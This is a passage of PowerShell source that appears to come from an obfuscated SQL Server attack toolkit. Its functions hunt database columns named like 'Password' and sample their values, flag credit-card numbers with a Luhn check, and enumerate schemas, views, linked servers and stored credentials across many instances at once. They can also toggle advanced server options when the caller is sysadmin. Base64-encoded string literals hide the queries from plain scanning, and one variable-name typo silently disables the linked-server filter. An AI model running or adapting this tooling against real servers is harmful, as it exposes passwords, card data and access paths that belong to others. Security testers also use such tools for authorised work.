        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAGIAbABlAA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAGwAdQBtAG4A'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBhAG0AcABsAGUA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBvAHcAQwBvAHUAbgB0AA=='))))
        if($ValidateCC)
        {
            $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEMAQwA='))))
        }
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(-not $TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : CONNECTION FAILED"
            }
            Return
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : START SEARCH DATA BY COLUMN"
                Write-Verbose -Message "$Instance : - Connection Success."
                Write-Verbose -Message "$Instance : - Searching for column names that match criteria..."
            }
            if($NoDefaults)
            {
                $Columns = Get-SQLColumn -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -ColumnNameSearch $Keywords -NoDefaults -SuppressVerbose
            }else
            {
                $Columns = Get-SQLColumn -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -ColumnNameSearch $Keywords -SuppressVerbose
            }
        }
        if($Columns)
        {
            $Columns|
            % -Process {
                $sDatabaseName = $_.DatabaseName
                $sSchemaName = $_.SchemaName
                $sTableName = $_.TableName
                $sColumnName = $_.ColumnName
                $AffectedColumn = "[$sDatabaseName].[$sSchemaName].[$sTableName].[$sColumnName]"
                $AffectedTable = "[$sDatabaseName].[$sSchemaName].[$sTableName]"
                $Query = "USE $sDatabaseName; SELECT TOP $SampleSize [$sColumnName] FROM $AffectedTable WHERE [$sColumnName] is not null"
                $QueryRowCount = "USE $sDatabaseName; SELECT count(CAST([$sColumnName] as VARCHAR(200))) as NumRows FROM $AffectedTable WHERE [$sColumnName] is not null"
                if( -not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance : - Column match: $AffectedColumn"
                    Write-Verbose -Message "$Instance : - Selecting $SampleSize rows of data sample from column $AffectedColumn."
                }
                $RowCount = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query $QueryRowCount -SuppressVerbose | select -Property NumRows -ExpandProperty NumRows
                Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query $Query -SuppressVerbose |
                select -ExpandProperty $sColumnName |
                % -Process {
                    if($ValidateCC)
                    {
                        $Value = 0
                        if([uint64]::TryParse($_,[ref]$Value))
                        {
                            $LuhnCheck = Test-IsLuhnValid $_ -ErrorAction SilentlyContinue
                        }
                        else
                        {
                            $LuhnCheck = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBhAGwAcwBlAA==')))
                        }
                        $null = $TblData.Rows.Add($ComputerName, $Instance, $sDatabaseName, $sSchemaName, $sTableName, $sColumnName, $_, $RowCount, $LuhnCheck)
                    }
                    else
                    {
                        $null = $TblData.Rows.Add($ComputerName, $Instance, $sDatabaseName, $sSchemaName, $sTableName, $sColumnName, $_, $RowCount)
                    }
                }
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : - No columns were found that matched the search."
            }
        }
        if( -not $SuppressVerbose)
        {
            Write-Verbose -Message "$Instance : END SEARCH DATA BY COLUMN"
        }
    }
    End
    {
        if ( -not $NoOutput)
        {
            Return $TblData
        }
    }
}
Function Get-SQLColumnSampleDataThreaded
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$NoOutput,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of records to sample.')]
        [int]$SampleSize = 1,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Comma seperated list of keywords to search for.')]
        [string]$Keywords = 'Password',
        [Parameter(Mandatory = $false,
        HelpMessage = 'Database name to filter on.')]
        [string]$DatabaseName,
        [Parameter(Mandatory = $false,
        HelpMessage = "Don't select tables from default databases.")]
        [switch]$NoDefaults,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Use Luhn formula to check if sample is a valid credit card.')]
        [switch]$ValidateCC,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of threads.')]
        [int]$Threads = 5,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        $TblData = New-Object -TypeName System.Data.DataTable
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBiAGEAcwBlAA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAGgAZQBtAGEA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAGIAbABlAA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAGwAdQBtAG4A'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBhAG0AcABsAGUA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBvAHcAQwBvAHUAbgB0AA=='))))
        if($ValidateCC)
        {
            $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEMAQwA='))))
        }
        $PipelineItems = New-Object -TypeName System.Data.DataTable
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        if($Instance)
        {
            $ProvideInstance = New-Object -TypeName PSObject -Property @{
                Instance = $Instance
            }
        }
        $PipelineItems = $PipelineItems + $ProvideInstance
    }
    Process
    {
        $PipelineItems = $PipelineItems + $_
    }
    End
    {
        $MyScriptBlock = {
            $Instance = $_.Instance
            $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
            if(-not $Instance)
            {
                $Instance = $env:COMPUTERNAME
            }
            $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
                $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
            }
            if(-not $TestConnection)
            {
                if( -not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance : CONNECTION FAILED"
                }
                Return
            }
            else
            {
                if( -not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance : START SEARCH DATA BY COLUMN"
                    Write-Verbose -Message "$Instance : - Connection Success."
                    Write-Verbose -Message "$Instance : - Searching for column names that match criteria..."
                }
                if($NoDefaults)
                {
                    $Columns = Get-SQLColumn -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -ColumnNameSearch $Keywords -NoDefaults -SuppressVerbose
                }else
                {
                    $Columns = Get-SQLColumn -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -ColumnNameSearch $Keywords -SuppressVerbose
                }
            }
            if($Columns)
            {
                $Columns|
                % -Process {
                    $sDatabaseName = $_.DatabaseName
                    $sSchemaName = $_.SchemaName
                    $sTableName = $_.TableName
                    $sColumnName = $_.ColumnName
                    $AffectedColumn = "[$sDatabaseName].[$sSchemaName].[$sTableName].[$sColumnName]"
                    $AffectedTable = "[$sDatabaseName].[$sSchemaName].[$sTableName]"
                    $Query = "USE $sDatabaseName; SELECT TOP $SampleSize [$sColumnName] FROM $AffectedTable WHERE [$sColumnName] is not null"
                    $QueryRowCount = "USE $sDatabaseName; SELECT count(CAST([$sColumnName] as VARCHAR(200))) as NumRows FROM $AffectedTable WHERE [$sColumnName] is not null"
                    if( -not $SuppressVerbose)
                    {
                        Write-Verbose -Message "$Instance : - Column match: $AffectedColumn"
                        Write-Verbose -Message "$Instance : - Selecting $SampleSize rows of data sample from column $AffectedColumn."
                    }
                    $RowCount = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query $QueryRowCount -SuppressVerbose | select -Property NumRows -ExpandProperty NumRows
                    Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query $Query -SuppressVerbose |
                    select -ExpandProperty $sColumnName |
                    % -Process {
                        if($ValidateCC)
                        {
                            $Value = 0
                            if([uint64]::TryParse($_,[ref]$Value))
                            {
                                $LuhnCheck = Test-IsLuhnValid $_ -ErrorAction SilentlyContinue
                            }
                            else
                            {
                                $LuhnCheck = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBhAGwAcwBlAA==')))
                            }
                            $null = $TblData.Rows.Add($ComputerName, $Instance, $sDatabaseName, $sSchemaName, $sTableName, $sColumnName, $_, $RowCount, $LuhnCheck)
                        }
                        else
                        {
                            $null = $TblData.Rows.Add($ComputerName, $Instance, $sDatabaseName, $sSchemaName, $sTableName, $sColumnName, $_, $RowCount)
                        }
                    }
                }
            }
            else
            {
                if( -not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance : - No columns were found that matched the search."
                }
            }
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : END SEARCH DATA BY COLUMN"
            }
        }
        $PipelineItems | Invoke-Parallel -ScriptBlock $MyScriptBlock -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue
        return $TblData
    }
}
Function  Get-SQLDatabaseSchema
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Database name.')]
        [string]$DatabaseName,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Schema name.')]
        [string]$SchemaName,
        [Parameter(Mandatory = $false,
        HelpMessage = "Don't select tables from default databases.")]
        [switch]$NoDefaults,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        $TblSchemas = New-Object -TypeName System.Data.DataTable
        if($SchemaName)
        {
            $SchemaNameFilter = " where schema_name like '%$SchemaName%'"
        }
        else
        {
            $SchemaNameFilter = ''
        }
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }
        if($NoDefaults)
        {
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -NoDefaults -SuppressVerbose
        }
        else
        {
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -SuppressVerbose
        }
        $TblDatabases |
        % -Process {
            $DbName = $_.DatabaseName
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Grabbing Schemas from the $DbName database..."
            }
            $Query = "  USE $DbName;
                SELECT  '$ComputerName' as [ComputerName],
                '$Instance' as [Instance],
                CATALOG_NAME as [DatabaseName],
                SCHEMA_NAME as [SchemaName],
                SCHEMA_OWNER as [SchemaOwner]
                FROM    [$DbName].[INFORMATION_SCHEMA].[SCHEMATA]
                $SchemaNameFilter
            ORDER BY SCHEMA_NAME"
            $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -SuppressVerbose
            $TblSchemas = $TblSchemas + $TblResults
        }
    }
    End
    {
        $TblSchemas
    }
}
Function  Get-SQLView
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Database name.')]
        [string]$DatabaseName,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'View name.')]
        [string]$ViewName,
        [Parameter(Mandatory = $false,
        HelpMessage = "Don't select tables from default databases.")]
        [switch]$NoDefaults,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        $TblViews = New-Object -TypeName System.Data.DataTable
        if($ViewName)
        {
            $ViewFilter = " where table_name like '%$ViewName%'"
        }
        else
        {
            $ViewFilter = ''
        }
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
                Write-Verbose -Message "$Instance : Grabbing views from the databases below:"
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }
        if($NoDefaults)
        {
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -NoDefaults -SuppressVerbose
        }
        else
        {
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -SuppressVerbose
        }
        $TblDatabases |
        % -Process {
            $DbName = $_.DatabaseName
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : - $DbName"
            }
            $Query = "  USE $DbName;
                SELECT  '$ComputerName' as [ComputerName],
                '$Instance' as [Instance],
                TABLE_CATALOG as [DatabaseName],
                TABLE_SCHEMA as [SchemaName],
                TABLE_NAME as [ViewName],
                VIEW_DEFINITION as [ViewDefinition],
                IS_UPDATABLE as [IsUpdatable],
                CHECK_OPTION as [CheckOption]
                FROM    [INFORMATION_SCHEMA].[VIEWS]
                $ViewFilter
            ORDER BY TABLE_CATALOG,TABLE_SCHEMA,TABLE_NAME"
            $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
            $TblViews = $TblViews + $TblResults
        }
    }
    End
    {
        $TblViews
    }
}
Function  Get-SQLServerLink
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server link name.')]
        [string]$DatabaseLinkName,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        $TblServerLinks = New-Object -TypeName System.Data.DataTable
        if($DatabaseLinkName)
        {
            $VDatabaseLinkNameFilter = " WHERE a.name like '$DatabaseLinkName'"
        }
        else
        {
            $DatabaseLinkNameFilter = ''
        }
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }
        $Query = "  SELECT  '$ComputerName' as [ComputerName],
            '$Instance' as [Instance],
            a.server_id as [DatabaseLinkId],
            a.name AS [DatabaseLinkName],
            CASE a.Server_id
            WHEN 0
            THEN 'Local'
            ELSE 'Remote'
            END AS [DatabaseLinkLocation],
            a.product as [Product],
            a.provider as [Provider],
            a.catalog as [Catalog],
            'LocalLogin' = CASE b.uses_self_credential
            WHEN 1 THEN 'Uses Self Credentials'
            ELSE c.name
            END,
            b.remote_name AS [RemoteLoginName],
            a.is_rpc_out_enabled,
            a.is_data_access_enabled,
            a.modify_date
            FROM [Master].[sys].[Servers] a
            LEFT JOIN [Master].[sys].[linked_logins] b
            ON a.server_id = b.server_id
            LEFT JOIN [Master].[sys].[server_principals] c
            ON c.principal_id = b.local_principal_id
        $DatabaseLinkNameFilter"
        $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $TblServerLinks = $TblServerLinks + $TblResults
    }
    End
    {
        $TblServerLinks
    }
}
Function  Get-SQLServerConfiguration
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Nubmer of hosts to query at one time.')]
        [int]$Threads = 5,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        $TblCommands = New-Object -TypeName System.Data.DataTable
        $TblResults = New-Object -TypeName System.Data.DataTable
        $null = $TblResults.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = $TblResults.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = $TblResults.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQA='))))
        $null = $TblResults.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AaQBtAHUAbQA='))))
        $null = $TblResults.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAaQBtAHUAbQA='))))
        $null = $TblResults.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBvAG4AZgBpAGcAXwB2AGEAbAB1AGUA'))))
        $null = $TblResults.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cgB1AG4AXwB2AGEAbAB1AGUA'))))
        $PipelineItems = New-Object -TypeName System.Data.DataTable
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        if($Instance)
        {
            $ProvideInstance = New-Object -TypeName PSObject -Property @{
                Instance = $Instance
            }
        }
        $PipelineItems = $PipelineItems + $ProvideInstance
    }
    Process
    {
        $PipelineItems = $PipelineItems + $_
    }
    End
    {
        $MyScriptBlock = {
            $Instance = $_.Instance
            $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
            if(-not $Instance)
            {
                $Instance = $env:COMPUTERNAME
            }
            if($DAC)
            {
                $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DAC -TimeOut $TimeOut
            }
            else
            {
                $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut
            }
            try
            {
                $Connection.Open()
                if(-not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance : Connection Success."
                }
                $DisableShowAdvancedOptions = 0
                $IsShowAdvancedEnabled = Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzACcA'))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property config_value -ExpandProperty config_value
                $IsSysadmin = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | select -Property IsSysadmin -ExpandProperty IsSysadmin
                if ($IsShowAdvancedEnabled -eq 1)
                {
                    if(-not $SuppressVerbose)
                    {
                        Write-Verbose -Message "$Instance : Show Advanced Options is already enabled."
                    }
                }
                else
                {
                    if(-not $SuppressVerbose)
                    {
                        Write-Verbose -Message "$Instance : Show Advanced Options is disabled."
                    }
                    if($IsSysadmin -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA'))))
                    {
                        if(-not $SuppressVerbose)
                        {
                            Write-Verbose -Message "$Instance : Your a sysadmin, trying to enabled it."
                        }
                        Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzACcALAAxADsAUgBFAEMATwBOAEYASQBHAFUAUgBFAA=='))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
                        $IsShowAdvancedEnabled2 = Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzACcA'))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property config_value -ExpandProperty config_value
                        if ($IsShowAdvancedEnabled2 -eq 1)
                        {
                            $DisableShowAdvancedOptions = 1
                            if(-not $SuppressVerbose)
                            {
                                Write-Verbose -Message "$Instance : Enabled Show Advanced Options."
                            }
                        }
                        else
                        {
                            if(-not $SuppressVerbose)
                            {
                                Write-Verbose -Message "$Instance : Enabling Show Advanced Options failed. Aborting."
                            }
                        }
                    }
                }
                Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUA'))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose |
                % -Process {
                    $SettingName = $_.name
                    $SettingMin = $_.minimum
                    $SettingMax = $_.maximum
                    $SettingConf_value = $_.config_value
                    $SettingRun_value = $_.run_value
                    $null = $TblResults.Rows.Add($ComputerName, $Instance, $SettingName, $SettingMin, $SettingMax, $SettingConf_value, $SettingRun_value)
                }
                if($DisableShowAdvancedOptions -eq 1 -and $IsSysadmin -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA'))))
                {
                    if(-not $SuppressVerbose)
                    {
                        Write-Verbose -Message "$Instance : Disabling Show Advanced Options"
                    }
                    $Configurations = Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzACcALAAwADsAUgBFAEMATwBOAEYASQBHAFUAUgBFAA=='))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
                }
                $Connection.Close()
                $Connection.Dispose()
            }
            catch
            {
                if(-not $SuppressVerbose)
                {
                    $ErrorMessage = $_.Exception.Message
                    Write-Verbose -Message "$Instance : Connection Failed."
                }
            }
        }
        $PipelineItems | Invoke-Parallel -ScriptBlock $MyScriptBlock -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue
        return $TblResults
    }
}
Function  Get-SQLServerCredential
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Credential name.')]
        [string]$CredentialName,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        $TblCredentials = New-Object -TypeName System.Data.DataTable
        if($CredentialName)
        {
            $CredentialNameFilter = " WHERE name like '$CredentialName'"
        }
        else
        {
            $CredentialNameFilter = ''
        }
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }
        $Query = "  USE master;
            SELECT  '$ComputerName' as [ComputerName],
            '$Instance' as [Instance],
            credential_id,
            name as [CredentialName],
            credential_identity,
            create_date,
            modify_date,
            target_type,
            target_id
            FROM [master].[sys].[credentials]
        $CredentialNameFilter"
        $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
